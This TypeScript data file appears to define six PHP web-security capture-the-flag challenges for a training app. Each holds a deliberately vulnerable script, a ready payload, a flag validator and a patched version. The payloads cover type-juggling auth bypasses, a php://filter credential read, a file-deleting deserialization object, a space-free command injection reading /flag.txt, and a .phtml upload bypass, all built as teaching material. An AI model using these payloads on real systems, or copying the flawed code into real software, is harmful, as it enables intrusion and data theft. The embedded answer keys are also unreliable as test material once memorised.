import { Challenge } from '../types';

export const CTF_CHALLENGES: Challenge[] = [
  {
    id: 'ctf-1',
    title: 'The Magic Hash Oracle',
    difficulty: 'Beginner',
    category: 'type-juggling',
    scenario: 'A legacy legacy corporate portal uses MD5 hashing with loose comparison ($hash == $secret). The developer stored an MD5 hash "0e215962017..." which they believed was unbreakable. Bypass authentication without cracking the master password!',
    targetScript: `<?php
// Flag Keeper Authentication
$stored_hash = "0e215962017382399127392817234912";
$user_input = $_POST['pass'] ?? '';

// Can you provide an input whose MD5 hash starts with 0e followed only by digits?
if (md5($user_input) == $stored_hash) {
    echo "Access Granted! FLAG{m4g1c_0e_c0ll1s10n_succ3ss}";
} else {
    echo "Invalid password hash.";
}
?>`,
    goal: 'Provide an input that hashes to a 0e... magic hash in MD5 (e.g. 240610708, QNKCDZO, s878926199a, or s155964671a).',
    hint: 'Look up known PHP MD5 magic hashes. What does md5("240610708") or md5("QNKCDZO") evaluate to?',
    initialInput: '240610708',
    validateFlagOrPayload: (input: string) => {
      const clean = input.trim();
      const validMagic = ['240610708', 'QNKCDZO', 's878926199a', 's155964671a', 's214587387a'];
      if (validMagic.includes(clean)) {
        return {
          success: true,
          flag: 'FLAG{m4g1c_0e_c0ll1s10n_succ3ss}',
          message: `Success! Input "${clean}" hashes to a 0e[0-9]+ magic hash. In PHP loose comparison (==), "0e..." == "0e..." evaluates to 0 == 0 (true)!`
        };
      }
      return {
        success: false,
        message: `Input "${clean}" does not generate a magic hash that triggers loose equality with 0e215962017... Try a known collision string like 240610708 or QNKCDZO.`
      };
    },
    patchCode: `if (hash_equals($stored_hash, md5($user_input))) {
    // Protected against type juggling & timing attacks
}`,
    patchExplanation: 'hash_equals() enforces strict byte-by-byte comparison in constant time, entirely nullifying loose float casting.'
  },
  {
    id: 'ctf-2',
    title: 'The Base64 Source Exfiltrator',
    difficulty: 'Intermediate',
    category: 'file-inclusion',
    scenario: 'An internal company portal has a dynamic page inclusion mechanism: include("pages/" . $_GET["page"] . ".php"). They store the database credentials in pages/credentials.php. If you include it directly, PHP executes it and leaves no output. Read the source code!',
    targetScript: `<?php
// Dynamic View Controller
$page = $_GET['page'] ?? 'home';

// The credentials file is located at: pages/credentials.php
// How can you read the PHP source code without triggering script execution?
include("pages/" . $page . ".php");
?>`,
    goal: 'Use the php://filter stream wrapper with base64-encode to exfiltrate credentials.php without executing it.',
    hint: 'Combine php://filter/convert.base64-encode/resource=credentials. Note that .php is appended by the script.',
    initialInput: 'php://filter/convert.base64-encode/resource=credentials',
    validateFlagOrPayload: (input: string) => {
      const clean = input.trim();
      if (clean.includes('php://filter') && clean.includes('base64') && clean.includes('credentials')) {
        return {
          success: true,
          flag: 'FLAG{b4s364_f1lt3r_s0urc3_3xf1l}',
          message: 'Stream filter intercepted the file read before Zend Engine compilation, dumping the raw source as Base64!'
        };
      }
      return {
        success: false,
        message: 'Ensure your payload uses php://filter, specifies convert.base64-encode, and targets the credentials resource.'
      };
    },
    patchCode: `$allowed_pages = ['home', 'dashboard', 'profile'];
if (!in_array($page, $allowed_pages, true)) {
    die("Access Denied");
}`,
    patchExplanation: 'A strict whitelist restricts dynamic inclusion to pre-approved identifiers, blocking all stream wrappers.'
  },
  {
    id: 'ctf-3',
    title: 'Ghost in the Object (POP Chain)',
    difficulty: 'Advanced',
    category: 'object-injection',
    scenario: 'A web app saves user session preferences in a base64 encoded serialized string. The codebase includes a FileCleanup helper whose __destruct() deletes a designated temporary file. Abuse this to remove /var/lock/admin_disabled!',
    targetScript: `<?php
class FileCleanup {
    public $filepath = "/tmp/cache.dat";
    
    public function __destruct() {
        if (file_exists($this->filepath)) {
            unlink($this->filepath);
        }
    }
}

$session_data = unserialize(base64_decode($_COOKIE['prefs']));
// Goal: Construct a serialized payload targeting /var/lock/admin_disabled
?>`,
    goal: 'Craft a serialized FileCleanup object where $filepath is set to "/var/lock/admin_disabled".',
    hint: 'PHP serialization format: O:11:"FileCleanup":1:{s:8:"filepath";s:25:"/var/lock/admin_disabled";}',
    initialInput: 'O:11:"FileCleanup":1:{s:8:"filepath";s:25:"/var/lock/admin_disabled";}',
    validateFlagOrPayload: (input: string) => {
      const clean = input.trim();
      if (clean.includes('FileCleanup') && clean.includes('/var/lock/admin_disabled')) {
        return {
          success: true,
          flag: 'FLAG{p0p_ch41n_d3struct_unl1nk_pwn}',
          message: 'Object deserialized! When PHP garbage collection ran at script shutdown, __destruct() unlinked the security lock file!'
        };
      }
      return {
        success: false,
        message: 'Payload must instantiate class FileCleanup with $filepath property pointing to /var/lock/admin_disabled.'
      };
    },
    patchCode: `// Replace unserialize with JSON decoding
$session_data = json_decode(base64_decode($_COOKIE['prefs']), true);
// Or strictly disable classes:
$session_data = unserialize($raw, ['allowed_classes' => false]);`,
    patchExplanation: 'Setting allowed_classes => false or using json_decode() prevents instantiation of user-defined classes and magic methods.'
  },
  {
    id: 'ctf-4',
    title: 'The Space-Free Command Bypass',
    difficulty: 'Intermediate',
    category: 'command-injection',
    scenario: 'A system diagnostic utility executes /bin/ping -c 1 $host. The developer created a filter that strips all literal whitespace (regex /\\s+/). How can you read /flag.txt without using space characters?',
    targetScript: `<?php
$host = $_GET['host'] ?? '127.0.0.1';

// Developer thought stripping spaces was safe!
$sanitized = preg_replace('/\\s+/', '', $host);

system("/bin/ping -c 1 " . $sanitized);
?>`,
    goal: 'Inject a command delimiter and use bash internal field separators (${IFS} or $IFS$9) to cat /flag.txt without literal spaces.',
    hint: 'Try: 127.0.0.1;cat${IFS}/flag.txt or 127.0.0.1;cat$IFS$9/flag.txt',
    initialInput: '127.0.0.1;cat${IFS}/flag.txt',
    validateFlagOrPayload: (input: string) => {
      const clean = input.trim();
      if (clean.includes(';cat') && (clean.includes('${IFS}') || clean.includes('$IFS$9') || clean.includes('<')) && clean.includes('flag.txt')) {
        return {
          success: true,
          flag: 'FLAG{sh3ll_1fs_sp4c3_byp4ss_m4st3r}',
          message: 'Bash expanded ${IFS} into the internal field separator (space/tab), executing cat /flag.txt despite the regex strip!'
        };
      }
      return {
        success: false,
        message: 'Payload must inject a command separator (like ;) and use a bash space alternative (${IFS} or <) without literal spaces.'
      };
    },
    patchCode: `if (!filter_var($host, FILTER_VALIDATE_IP)) {
    die("Invalid IP address");
}
$safe_host = escapeshellarg($host);
system("/bin/ping -c 1 " . $safe_host);`,
    patchExplanation: 'Validating IP format strictly and using escapeshellarg() wraps the value in single quotes, preventing shell command injection.'
  },
  {
    id: 'ctf-5',
    title: 'The Array strcmp() Discrepancy',
    difficulty: 'Intermediate',
    category: 'type-juggling',
    scenario: 'A token validation routine checks strcmp($_POST["token"], $secret_key) == 0. Can you bypass this check without knowing the 64-character secret token?',
    targetScript: `<?php
$secret_key = "a98df71b2e4c09d81f237890b1c2e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1";
$token = $_POST['token'];

// FLAW: What happens if $token is an array instead of a string?
if (strcmp($token, $secret_key) == 0) {
    echo "Authenticated! FLAG{str_cmp_4rr4y_null_byp4ss}";
} else {
    echo "Invalid Token.";
}
?>`,
    goal: 'Simulate passing an array parameter (e.g. token[]=whatever or array input) so strcmp returns NULL.',
    hint: 'In HTTP, form arrays are passed as token[]=x. In PHP, strcmp(array, string) returns NULL. And in PHP loose typing, NULL == 0 evaluates to true!',
    initialInput: 'token[]=',
    validateFlagOrPayload: (input: string) => {
      const clean = input.trim();
      if (clean.includes('token[]') || clean.includes('[]') || clean === 'array') {
        return {
          success: true,
          flag: 'FLAG{str_cmp_4rr4y_null_byp4ss}',
          message: 'strcmp() cannot handle an array and returns NULL. Because NULL == 0 evaluates to true in PHP loose typing, authentication succeeded!'
        };
      }
      return {
        success: false,
        message: 'Try submitting token as an array using the PHP array syntax (e.g. token[]=).'
      };
    },
    patchCode: `// Validate string type explicitly and use strict comparison
if (!is_string($token) || !hash_equals($secret_key, $token)) {
    die("Invalid Token");
}`,
    patchExplanation: 'Explicit type validation (is_string) and hash_equals() prevent array-based strcmp nullification.'
  },
  {
    id: 'ctf-6',
    title: 'The .phtml Smuggler',
    difficulty: 'Intermediate',
    category: 'file-upload',
    scenario: 'An avatar upload form blocks files ending in ".php" and verifies that the file extension is not ".php". How can you upload a PHP executable file to the web server?',
    targetScript: `<?php
$filename = $_FILES['avatar']['name'];

// Flawed Blacklist: Only checks .php
if (preg_match('/\\.php$/i', $filename)) {
    die("Executable .php files are blocked!");
}

move_uploaded_file($_FILES['avatar']['tmp_name'], "uploads/" . $filename);
?>`,
    goal: 'Upload a file using an alternate PHP execution extension such as .phtml, .php5, or .phar.',
    hint: 'Apache mod_php often maps .phtml, .php3, .php4, .php5, and .phar to the PHP interpreter by default.',
    initialInput: 'shell.phtml',
    validateFlagOrPayload: (input: string) => {
      const clean = input.trim().toLowerCase();
      if (clean.endsWith('.phtml') || clean.endsWith('.php5') || clean.endsWith('.phar') || clean.endsWith('.pht')) {
        return {
          success: true,
          flag: 'FLAG{phtml_3xt_smuggl3d_rce}',
          message: `The server accepted ${clean}! Apache default mime configuration associates .phtml with application/x-httpd-php, executing the script!`
        };
      }
      return {
        success: false,
        message: 'Your file extension must be an executable alternate PHP extension (e.g. .phtml, .php5, or .phar).'
      };
    },
    patchCode: `$allowed_extensions = ['jpg', 'png', 'gif'];
$ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
if (!in_array($ext, $allowed_extensions, true)) {
    die("Only images allowed!");
}`,
    patchExplanation: 'Always use an explicit whitelist of safe extensions, generate randomized filenames, and store files outside public directories.'
  }
];
